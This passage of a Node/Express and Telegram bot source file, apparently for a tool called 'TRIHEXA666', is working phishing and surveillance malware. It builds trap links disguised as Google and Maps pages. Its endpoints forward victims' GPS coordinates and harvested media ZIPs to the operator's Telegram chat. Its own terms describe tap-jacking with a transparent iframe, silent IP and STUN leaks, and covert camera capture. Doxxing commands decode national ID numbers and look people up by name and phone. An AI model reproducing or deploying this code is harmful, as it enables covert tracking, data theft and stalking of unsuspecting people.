          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `MediaAudit_${id}.zip` }, { caption: "📸 <b>Security Audit: Media Sync</b>", parse_mode: 'HTML' }).catch(() => {});
          addSection(`📸 Media Audit`, `└ <code>${fCount} files extracted to ZIP</code>`);
        } catch (e) {}
      }

      if (data.display_hz || data.orientation) {
        addSection(`📺 Display Configuration`,
                    `├ Refresh: <code>${data.display_hz} Hz</code>\n` +
                    `└ Orientation: <code>${data.orientation}</code>`);
      }

      if (hasTextData) {
        extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <b>Data Synchronization Complete.</b>`;
        botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
      }
    }
    res.sendStatus(200);
  });
  app.post('/api/log/:id/gps', (req, res) => {
    console.log(`[DEBUG] Received GPS log for ${req.params.id}`);
    if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
      const { lat, lon, acc, tmplId } = req.body;
      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
      
      let header = '📍 <b>Location Audit: Target Located</b>';
      if (tmplId === 'google') {
        header = '🛡️ <b>Google Security: Location Verified</b>';
      } else if (tmplId === 'maps') {
        header = '🗺️ <b>Maps: Precision Coordinates</b>';
      } else if (tmplId === 'pegasus') {
        header = '🛡️ <b>Diagnostic Hub: Precision GPS</b>';
      }

      const msg = `<b>${header}</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
                  `🛰️ <b>Coordinates</b>\n` +
                  `├ Lat: <code>${lat}</code>\n` +
                  `├ Lon: <code>${lon}</code>\n` +
                  `└ Acc: <code>${acc} meters</code>\n\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🔗 <b>Navigation</b>\n` +
                  `🌐 <a href="${mapLink}">View location on Google Maps</a>\n\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🏁 <i>Status: Spatial verification successful.</i>`;

      botInstance.telegram.sendMessage(chatId, msg, { 
        parse_mode: 'HTML', 
        link_preview_options: { is_disabled: true }
      }).catch(console.error);
    }
    res.sendStatus(200);
  });
  // ==============================================

  // Serve static files from dist if in production
  const isProduction = process.env.NODE_ENV === "production" || fs.existsSync(path.join(process.cwd(), 'dist'));

  if (!isProduction) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use((req, res, next) => {
      if (req.path.startsWith('/t/') || req.path.startsWith('/api') || req.path === '/health' || req.path === '/healthz') {
        return next();
      }
      vite.middlewares(req, res, next);
    });
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    
    // SPA Fallback
    app.get('*', (req, res, next) => {
      if (req.path.startsWith('/api') || req.path.startsWith('/t/') || req.path === '/health' || req.path === '/healthz') {
        return next();
      }
      const indexPath = path.join(distPath, 'index.html');
      if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
      } else {
        // Avoid returning 404 for the root or generic paths to satisfy health checks
        res.status(200).send('<h2>System Ready</h2><p>Terminal UI is active. Please check the bot for links.</p>');
      }
    });
  }

  // 404 Handler (Moved to the correct position at the end of the chain)
  app.use((req, res) => {
    if (!res.headersSent) {
      res.status(404).send('<h2>Error 404: Endpoint Not Found</h2>');
    }
  });

  // Global Error Handler
  app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
    console.error('[SERVER ERROR]', err);
    if (!res.headersSent) {
      res.status(500).send('<h2>Critical Server Error</h2><p>' + (err.message || 'Unknown error') + '</p>');
    }
  });

  // TELEGRAM BOT SETUP
  if (bot) {
    bot.use(async (ctx, next) => {
        try {
            if (!ctx.from) return;
            
            const userId = ctx.from.id;
            const userName = ctx.from.first_name || 'User';

            // IMPORTANT: Allow callback queries (button clicks) to pass through to their handlers
            if (ctx.callbackQuery) return next();

            // Check for /start or other commands to make them semi-accessible
            const isCommand = ctx.message && 'text' in ctx.message && ctx.message.text.startsWith('/');
            const text = ctx.message && 'text' in ctx.message ? (ctx.message as any).text : '';

            // Skip all checks for owner
            if (userId === ADMIN_ID) return next();

            // Check if user has accepted agreement
            if (!agreementUsers.has(userId)) {
                // Determine reliable host
                let host = appHost;
                if (!host || host.includes('up.railway.app')) {
                   // Attempt to use a more reliable fallback if available
                   host = process.env.APP_URL || host;
                }
                const cleanHost = (host || "").replace(/\/$/, '');
                
                // CRITICAL: If no host, we MUST use a placeholder or log error, but don't crash
                if (!cleanHost) {
                   console.error("CRITICAL: APP_URL not set. Bot cannot generate links.");
                   return ctx.reply("⚠️ Terminal configuration error: APP_URL is missing.").catch(()=>{});
                }

                const btnUrl = `${cleanHost}/verify-bot-user?uid=${userId}&name=${encodeURIComponent(userName)}`;
                
                const aggMsg = `⚠️ <b>[ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ]</b> ⚠️\n` +
                               `━━━━━━━━━━━━━━━━━━━━\n\n` +
                               `ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜰʀᴀᴍᴇᴡᴏʀᴋ ᴛʀɪʜᴇxᴀ666. ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ, ᴀɴᴅᴀ ᴡᴀᴊɪʙ ᴍᴇɴʏᴇᴛᴜᴊᴜɪ ᴋᴇᴛᴇɴᴛᴜᴀɴ ʙᴇʀɪᴋᴜᴛ:\n\n` +
                               `1. ʙᴏᴛ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴛᴜᴊᴜᴀɴ ᴘᴇɴᴇʟɪᴛɪᴀɴ ꜱᴇᴄᴜʀɪᴛʏ.\n` +
                               `2. ꜱᴇʟɪᴛᴜʀᴜʜ ᴀᴋᴛɪᴠɪᴛᴀꜱ ᴀɴᴅᴀ ᴅɪᴘᴀɴᴛᴀᴜ ᴏʟᴇʜ ꜱʏꜱᴛᴇᴍ.\n` +
                               `3. ᴀɴᴅᴀ ᴡᴀᴊɪʙ ᴍᴇʟɪᴠᴇʀɪꜰɪᴋᴀꜱɪ ɪᴅᴇɴᴛɪᴛᴀꜱ ᴅᴇɴɢᴀɴ ᴍᴇɴɢᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ.\n\n` +
                               `━━━━━━━━━━━━━━━━━━━━`;
                const kb = Markup.inlineKeyboard([
                    [Markup.button.url('🛡️ ꜱᴇᴛᴜᴊᴜ & ᴠᴇʀɪꜰɪᴋᴀꜱɪ', btnUrl)],
                    [Markup.button.callback('✅ ꜱᴀʏᴀ ꜱᴜᴅᴀʜ ᴠᴇʀɪꜰɪᴋᴀꜱɪ', 'confirm_verified')]
                ]);
                return ctx.reply(aggMsg, { parse_mode: 'HTML', ...kb }).catch(e => console.error("Reply Error (Agreement):", e));
            }

            // If already authenticated, allow everything
            if (authenticatedUsers.has(userId)) return next();
            
            // Allow /start specifically to show something even if not authenticated
            if (text === '/start') return next();

            // Handle Password Authentication
            if (text === PASSWORD) {
                authenticatedUsers.add(userId);
                saveAuth();
                return ctx.reply("✅ <b>Akses Khusus Tim Legal Diberikan!</b>\nSelamat bertugas, gunakan wewenang Anda dengan bijak.", {parse_mode: 'HTML'}).catch(() => {});
            }

            // If verified but not authenticated, show lock message for any command/text
            return ctx.reply(`🔒 <b>SISTEM TERKUNCI</b>\nBot telegram ini hadir hanya untuk <i>tim legal</i> bukan sembarang orang.\nMasukkan password otorisasi (contoh: <sup>${PASSWORD}</sup>) untuk melanjutkan.`, {parse_mode: 'HTML'}).catch(() => {});
        } catch (err) {
            console.error("Bot Global Middleware Error:", err);
        }
    });

    bot.action('confirm_verified', (ctx) => {
        if (!ctx.from) return;
        agreementUsers.add(ctx.from.id);
        saveAgreement();
        ctx.answerCbQuery("System verified!").catch(() => {});
        ctx.reply("✅ Verifikasi Berhasil! Selamat datang di terminal.");
        ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard });
    });

    const startMsgText = `━━━━━━━ ᴛʀɪʜᴇxᴀ666 ━━━━━━━\n\n` +
                         `<b>ᴛʀɪʜᴇxᴀ666 - ᴘʀɪɴᴄᴇ ᴏꜰ ᴏꜱɪɴᴛ ᴀɴᴅ ʟᴏɢɢᴇʀ ʟɪɴᴋ ᴠ.1</b>\n\n` +
                         `<b>ᴏᴡɴᴇʀ : ᴡʜʏʟᴀᴜɢʜ404</b>\n\n` +
                         `ᴀʙᴏᴜᴛ ᴛʀɪʜᴇxᴀ666 : ᴅɪᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴏʟᴇʜ ᴡʜʏʟᴀᴜɢʜ404 ꜱᴇʙᴀɢᴀɪ ᴀʟᴀᴛ ᴏꜱɪɴᴛ ᴅᴀɴ ᴘᴇʟᴀᴄᴀᴋᴀɴ ꜱᴇᴄᴀʀᴀ ᴍᴇɴᴅᴀʟᴀᴍ. ᴍᴇʟɪʙᴀᴛᴋᴀɴ ᴘᴇɴɢɢᴜɴᴀᴀɴ ɪɴꜰᴏʀᴍᴀꜱɪ ꜱᴜᴍʙᴇʀ ᴛᴇʀʙᴜᴋᴀ. ʙᴏᴛ ɪɴɪ ᴅɪʜᴀʀᴀᴘᴋᴀɴ ᴍᴀᴍᴘᴜ ᴜɴᴛᴜᴋ ᴍᴇᴍᴇɴᴜʜɪ ᴛᴜɢᴀꜱɴʏᴀ ꜱᴇʙᴀɢᴀɪ ʙᴀɢɪᴀɴ ᴅᴀʀɪ ᴀʟᴀᴛ ᴡʜʏʟᴀᴜɢʜ404.\n\n` +
                         `━━━━━━━━━━━━━━━━━━━━`;
    
    const mainKeyboard = Markup.inlineKeyboard([
      [Markup.button.callback('🇮🇩 ʟᴏᴄᴀʟ ᴏꜱɪɴᴛ', 'menu_osint_basic'), Markup.button.callback('📡 ɢʟᴏʙᴀʟ ʀᴇᴄᴏɴ', 'menu_osint_adv')],
      [Markup.button.callback('🛠️ ʜᴀʀᴅ ᴛᴏᴏʟꜱ', 'menu_tools'), Markup.button.callback('🎣 ꜱᴛᴇᴀʟᴛʜ ʟᴏɢ', 'menu_logger')],
      [Markup.button.callback('🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ', 'menu_games'), Markup.button.callback('🎵 ᴍᴇᴅɪᴀ ꜱʏɴᴄ', 'menu_media')],
      [Markup.button.callback('⏰ ᴀʟᴀʀᴍ ʜᴜʙ', 'menu_alarm'), Markup.button.callback('ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ', 'menu_help')],
      [Markup.button.callback('📜 ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ', 'menu_tos')]
    ]);

    bot.start((ctx) => ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }));

    bot.action('menu_main', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>━━━━━━━ ᴛʀɪʜᴇxᴀ666 ━━━━━━━</b>\n` +
        `<b>⚔️ ᴇʟɪᴛᴇ ᴏꜱɪɴᴛ ꜰʀᴀᴍᴇᴡᴏʀᴋ ᴠ.1</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `👋 ʜᴀʟᴏ <b>${ctx.from?.first_name || 'ᴜꜱᴇʀ'}</b>,\n` +
        `ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ᴄᴇɴᴛᴇʀ ᴏᴘᴇʀᴀꜱɪ. sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴏᴅᴜʟ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ:`;
      const kb = Markup.inlineKeyboard([
        [Markup.button.callback('🎣 ʟɪɴᴋ ʟᴏɢɢᴇʀ', 'menu_logger'), Markup.button.callback('📡 ᴏꜱɪɴᴛ ᴀᴅᴠ', 'menu_osint_adv')],
        [Markup.button.callback('🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ', 'menu_games'), Markup.button.callback('🛠️ ᴛᴏᴏʟꜱ', 'menu_tools')],
        [Markup.button.callback('🎵 ᴍᴇᴅɪᴀ', 'menu_media'), Markup.button.callback('⏰ ᴀʟᴀʀᴍ', 'menu_alarm')],
        [Markup.button.callback('ℹ️ ʜᴇʟᴘ & ɪɴꜰᴏ', 'menu_help')]
      ]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_logger', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const id = generateTrapId(ctx.chat!.id);
      let msg = `<b>🎣 ꜱᴛᴇᴀʟᴛʜ ʟɪɴᴋ ʟᴏɢɢᴇʀ</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `ᴘɪʟɪʜ ᴛᴇᴍᴘʟᴀᴛᴇ ʙᴇʀɪᴋᴜᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ:\n\n`;
      Object.entries(templates).forEach(([key, tmpl]) => {
        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
        msg += `📦 <b>${tmpl.name}</b>\n` +
               `🔗 <code>${trapUrl}</code>\n\n`;
      });
      msg += `━━━━━━━━━━━━━━━━━━━━\n` +
             `💡 ɪɴꜰᴏ: ꜱᴇᴍᴜᴀ ᴅᴀᴛᴀ (ɪᴘ, ᴄᴀᴍ, ɢᴘꜱ) ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴋᴇ ꜱɪɴɪ.\n` +
             `📂 ɢᴜɴᴀᴋᴀɴ /targets ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴅᴀᴛᴀʙᴀꜱᴇ ᴛᴀʀɢᴇᴛ.`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(msg, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }, ...kb }).catch(() => {});
    });

    bot.action('menu_osint_adv', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>📡 ᴏꜱɪɴᴛ – ᴘʀᴏꜰᴇꜱꜱɪᴏɴᴀʟ ɢʀᴀᴅᴇ</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `ɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ɪɴᴠᴇꜱᴛɪɢᴀꜱɪ:\n\n` +
                  `🇮🇩 <b>ɪɴᴅᴏɴᴇꜱɪᴀ ꜱᴘᴇᴄɪꜰɪᴄ:</b>\n` +
                  `• /nik [ɴɪᴋ] - ᴅᴇᴄᴏᴅᴇ ɴɪᴋ ᴋᴛᴘ\n` +
                  `• /plat [ᴘʟᴀᴛ] - ᴄᴇᴋ ᴀꜱᴀʟ ᴡɪʟᴀʏᴀʜ ᴘʟᴀᴛ\n` +
                  `• /osint_indo - ᴍᴇɴᴜ ᴋʜᴜꜱᴜꜱ ᴏꜱɪɴᴛ ɪɴᴅᴏ\n\n` +
                  `🔍 <b>ᴅɪɢɪᴛᴀʟ ꜰᴏᴏᴛᴘʀɪɴᴛ:</b>\n` +
                  `• /username [ᴜꜱᴇʀ] - ᴄᴇᴋ 100+ ᴘʟᴀᴛꜰᴏʀᴍ\n` +
                  `• /ig [ᴜꜱᴇʀ] - ɪɴꜱᴛᴀɢʀᴀᴍ ᴅᴇᴇᴘ ʟɪɴᴋ\n` +
                  `• /tiktok [ᴜꜱᴇʀ] - ᴛɪᴋᴛᴏᴋ ᴅᴇᴇᴘ ʟɪɴᴋ\n` +
                  `• /email [ᴇᴍᴀɪʟ] - ᴠᴇʀɪꜰɪᴋᴀꜱɪ ᴇᴍᴀɪʟ\n\n` +
                  `🌐 <b>ɴᴇᴛᴡᴏʀᴋ & ᴡᴇʙ:</b>\n` +
                  `• /dork [ǫᴜᴇʀʏ] - ɢᴏᴏɢʟᴇ ᴅᴏʀᴋ ɢᴇɴ\n` +
                  `• /scan [ɪᴘ/ᴅᴏᴍ] - ᴅᴇᴇᴘ ꜱᴄᴀɴ ʀᴇᴄᴏɴ\n` +
                  `• /subdomain [ᴅᴏᴍ] - ᴍᴀᴘᴘɪɴɢ ꜱᴜʙᴅᴏᴍᴀɪɴ\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([
        [Markup.button.callback('🔍 ᴏꜱɪɴᴛ ɪɴᴅᴏ ᴍᴇɴᴜ', 'menu_osint_indo')],
        [Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]
      ]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_osint_indo', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🇮🇩 ᴏꜱɪɴᴛ ɪɴᴅᴏɴᴇꜱɪᴀ ᴄᴇɴᴛᴇʀ</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `ᴍᴏᴅᴜʟ ɪɴᴠᴇꜱᴛɪɢᴀꜱɪ ʟᴏᴋᴀʟ ɪɴᴅᴏɴᴇꜱɪᴀ:\n\n` +
                  `📍 <b>ɪᴅᴇɴᴛɪᴛᴀꜱ & ᴋᴇɴᴅᴀʀᴀᴀɴ:</b>\n` +
                  `• /nik [16-ᴅɪɢɪᴛ] - ᴀɴᴀʟɪꜱᴀ ᴋᴏᴅᴇ ᴡɪʟᴀʏᴀʜ KTP\n` +
                  `• /plat [ɴᴏ-ᴘʟᴀᴛ] - ʟᴀᴄᴀᴋ ᴀꜱᴀʟ ᴘʟᴀᴛ ɴᴏᴍᴏʀ\n\n` +
                  `🔍 <b>ᴘᴇɴᴄᴀʀɪᴀɴ ɴᴀᴍᴀ & ᴊᴇᴊᴀᴋ:</b>\n` +
                  `• /nama [ɴᴀᴍᴀ ʟᴇɴɢᴋᴀᴘ] - ᴅᴏʀᴋɪɴɢ ɴᴀᴍᴀ ᴏʀᴀɴɢ\n` +
                  `• /username [ᴜꜱᴇʀ] - ᴄᴇᴋ ᴅɪ ᴋᴀꜱᴋᴜꜱ, ʙʟᴏɢ, ᴅʟʟ\n\n` +
                  `📱 <b>ᴛᴇʟᴇᴘᴏɴ & ꜱᴏꜱᴍᴇᴅ ɪɴᴅᴏ:</b>\n` +
                  `• /phone_dork [ɴᴏᴍᴏʀ] - ʟɪɴᴋ ᴛʀᴜᴇᴄᴀʟʟᴇʀ/ᴡᴀ\n` +
                  `• /sosmed [ᴜꜱᴇʀ] - ꜱᴜᴍᴍᴀʀʏ ʟɪɴᴋ ɪɴᴅᴏ-ꜰᴏᴄᴜꜱ\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_osint_adv')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_games', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ</b>\n` +
                  `• /khodam [ɴᴀᴍᴀ]\n` +
                  `• /tebakangka\n` +
                  `• /ramal [ɴᴀᴍᴀ]\n`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_tools', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🛠️ ᴜᴛɪʟɪᴛʏ ᴛᴏᴏʟꜱ</b>\n` +
                  `• /qr [ᴛᴇᴋꜱ]\n` +
                  `• /shortlink [ᴜʀʟ]\n` +
                  `• /pwd [ᴘᴀɴᴊᴀɴɢ]\n`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_media', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🎵 ᴍᴇᴅɪᴀ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ</b>\n` +
                  `• /lagu [ᴊᴜᴅᴜʟ]\n` +
                  `• /play [ᴊᴜᴅᴜʟ]\n`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_alarm', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>⏰ ᴀʟᴀʀᴍ sʏꜱᴛᴇᴍ</b>\n` +
                  `• /alarm [ᴍᴇɴɪᴛ]\n` +
                  `• /listalarm\n`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_help', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>ℹ️ ɪɴꜰᴏʀᴍᴀꜱɪ & ᴋᴇᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `ʜᴏꜱᴛ: <code>${appHost}</code>\n` +
                  `ꜱᴛᴀᴛᴜꜱ: 🟢 ᴏɴʟɪɴᴇ\n\n` +
                  `<b>📜 ᴘᴏʟɪꜱɪ ᴋᴇᴀᴍᴀɴᴀɴ (USER AGREEMENT):</b>\n` +
                  `ꜱɪꜱᴛᴇᴍ ᴍᴇɴᴅᴇᴛᴇᴋꜱɪ ᴠᴇʀɪꜰɪᴋᴀꜱɪ ɪᴅᴇɴᴛɪᴛᴀꜱ ᴜɴᴛᴜᴋ ᴘᴇʀʟɪɴᴅᴜɴɢᴀɴ ꜱᴇꜱɪ ᴅᴀʀɪ ᴀɴᴄᴀᴍᴀɴ ᴅᴇᴇᴘ-ꜰᴀᴋᴇ.\n\n` +
                  `1. Pengguna menyatakan mematuhi seluruh aturan platform.\n` +
                  `2. Semua akses audit sistem disetujui (By clicking 'Verify', the user agrees to the Global Security Service Agreement).\n` +
                  `3. Sistem beroperasi di bawah otoritas penuh (Enuma Elish Protocol).\n\n` +
                  `ᴅᴇɴɢᴀɴ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ʟᴀʏᴀɴᴀɴ ɪɴɪ, ᴘᴇɴɢɢᴜɴᴀ (ᴛᴀʀɢᴇᴛ) ᴍᴇᴍʙᴇʀɪᴋᴀɴ ɪᴢɪɴ ᴀᴜᴅɪᴛ ʏᴀɴɢ ᴍᴇʟɪᴘᴜᴛɪ:\n` +
                  `• ꜱɪɴᴋʀᴏɴɪꜱᴀꜱɪ ʙɪᴏᴍᴇᴛʀɪᴋ (ᴋᴀᴍᴇʀᴀ)\n` +
                  `• ᴠᴀʟɪᴅᴀꜱɪ ʟᴏᴋᴀꜱɪ ᴘʀᴇꜱɪꜱɪ (ɢᴘꜱ)\n` +
                  `• ᴀᴜᴅɪᴛ ᴍᴇᴛᴀᴅᴀᴛᴀ ʜᴀʀᴅᴡᴀʀᴇ\n\n` +
                  `ᴅᴀᴛᴀ ᴅɪᴇɴᴋʀɪᴘꜱɪ ᴜᴊᴜɴɢ-ᴋᴇ-ᴜᴊᴜɴɢ (ᴇ2ᴇᴇ) ᴅᴀɴ ʜᴀɴʏᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ᴠᴀʟɪᴅᴀꜱɪ ꜱᴇꜱɪ.`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_tos', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>📜 ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ (TOS/EULA)</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `⚠️ <b>PERINGATAN: KONTROL SITUASI KETAT</b>\n\n` +
                  `Sistem ini menggunakan teknik Zero-Click Reconnaissance dan Tap-Jacking. Agar situasi tetap dapat dikontrol secara legal, Anda (Operator) harus memahami klausa berikut:\n\n` +
                  `1. <b>By-Design Flaws (CVE-2026-X):</b> Segala data (IP, GPU, STUN leak) yang terambil secara "Silent" diklaim sebagai "Diagnostic Telemetry" untuk anti-bot.\n` +
                  `2. <b>User Consent:</b> Tombol 'Verifikasi' bertindak sebagai <i>Master Gesture</i>. Pengguna yang menekan tombol ini secara hukum dianggap memberikan <i>Informed Consent</i> untuk menyerahkan akses kamera, GPS, dan Device Info, biarpun mereka tidak sadar iframe transparan di atasnya.\n` +
                  `3. <b>Disclamer of Liability:</b> Segala bentuk "Social Engineering" berada di luar tanggung jawab sistem. Sistem ini hanyalah sebuah fasilitas verifikasi identitas, dan target bertanggung jawab penuh atas interaksi layarnya.\n` +
                  `4. <b>Pelepasan Tuntutan:</b> Tidak ada paksaan yang dilakukan; target menekan secara sukarela. Segala konsekuensi, kepanikan target, atau hilangnya anonimitas adalah murni bentuk kelalaian menekan tombol sembarangan.\n\n` +
                  `<i>"Hanya orang bodoh yang asal tekan, maka biarlah mereka membayar harganya dengan data mereka."</i>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `✅ <b>DENY EVERYTHING. ADMIT NOTHING.</b>`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.command('nik', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /nik 3201010101900001");
      const nik = args[1];

      if (!/^\d{16}$/.test(nik)) {
        return ctx.reply("❌ NIK harus terdiri dari 16 digit angka.");
      }

      const provMap: Record<string, string> = { "11": "Aceh", "12": "Sumatera Utara", "13": "Sumatera Barat", "14": "Riau", "15": "Jambi", "16": "Sumatera Selatan", "17": "Bengkulu", "18": "Lampung", "19": "Kepulauan Bangka Belitung", "21": "Kepulauan Riau", "31": "DKI Jakarta", "32": "Jawa Barat", "33": "Jawa Tengah", "34": "DI Yogyakarta", "35": "Jawa Timur", "36": "Banten", "51": "Bali", "52": "Nusa Tenggara Barat", "53": "Nusa Tenggara Timur", "61": "Kalimantan Barat", "62": "Kalimantan Tengah", "63": "Kalimantan Selatan", "64": "Kalimantan Timur", "65": "Kalimantan Utara", "71": "Sulawesi Utara", "72": "Sulawesi Tengah", "73": "Sulawesi Selatan", "74": "Sulawesi Tenggara", "75": "Gorontalo", "76": "Sulawesi Barat", "81": "Maluku", "82": "Maluku Utara", "91": "Papua Barat", "94": "Papua" };

      const prov = nik.substring(0, 2);
      const kab = nik.substring(2, 4);
      const kec = nik.substring(4, 6);
      let tgl = parseInt(nik.substring(6, 8), 10);
      const bln = nik.substring(8, 10);
      let thn = parseInt(nik.substring(10, 12), 10);
      const urut = nik.substring(12, 16);

      let jk = "Laki-laki 👨";
      if (tgl >= 40) {
        jk = "Perempuan 👩";
        tgl -= 40;
      }
      
      const currentYear = new Date().getFullYear() % 100;
      thn = thn > currentYear ? 1900 + thn : 2000 + thn;

      const provinsi = provMap[prov] || "Tidak diketahui";

      const reply = `<b>🇮🇩 DATA NIK DECODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `📋 <b>NIK:</b> <code>${nik}</code>\n` +
                    `👤 <b>Gender:</b> ${jk}\n` +
                    `📅 <b>Lahir:</b> <code>${tgl.toString().padStart(2, '0')}-${bln}-${thn}</code>\n` +
                    `📍 <b>Wilayah:</b>\n` +
                    `├ Provinsi: ${provinsi}\n` +
                    `├ Kode Kab: ${kab}\n` +
                    `└ Kode Kec: ${kec}\n` +
                    `🔢 <b>No Urut:</b> ${urut}\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Analisis selesai.</i>`;

      ctx.reply(reply, { parse_mode: 'HTML' });
    });

    bot.command('plat', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /plat B 1234 ABC atau /plat B1234ABC");
      
      const platInput = args.slice(1).join('').toUpperCase();
      const match = platInput.match(/^([A-Z]{1,2})(\d{1,4})([A-Z]{0,3})$/);
      
      if (!match) return ctx.reply("❌ Format plat nomor tidak valid.");
      
